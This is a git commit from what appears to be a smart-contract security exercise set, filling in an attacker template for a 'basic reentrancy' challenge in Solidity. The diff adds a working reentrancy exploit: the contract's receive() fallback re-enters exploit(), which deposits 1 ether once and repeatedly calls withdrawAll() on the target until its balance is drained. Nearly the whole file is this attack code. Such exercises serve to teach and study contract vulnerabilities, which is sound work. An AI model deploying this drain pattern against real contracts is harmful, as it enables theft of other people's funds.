d3967f8e516d238207dd1432891fe423347ed22f
ikcoin <ikcoin.kb@protonmail.com>
2023-05-15 12:29:26 +0200

    00 Basic reentrancy

--- src/00-template_attacker.sol
+++ src/00-template_attacker.sol
@@ -1,31 +1,37 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity ^0.8.13;
 
-
 interface IVulnerable {
     function withdraw() external;
+
     function deposit() external payable;
+
+    function userBalance(address) external;
+
+    function withdrawAll() external;
 }
 
-
 contract Attacker {
+    IVulnerable public target;
+    bool public firstTimeDeposit;
 
-	IVulnerable public target;
-	
-	constructor(address _target) {
-		target = IVulnerable(_target);
-	}
+    constructor(address _target) {
+        target = IVulnerable(_target);
+    }
 
     receive() external payable {
-        /*
-            Your code goes here!
-        */
+        if (address(target).balance > 0) {
+            exploit();
+        }
     }
 
     function exploit() public payable {
-        
-        /*
-            Your code goes here!
-        */
+        //First time deposit funds
+        if (!firstTimeDeposit) {
+            firstTimeDeposit = true;
+            target.deposit{value: 1 ether}();
+        }
+
+        target.withdrawAll();
     }
 }
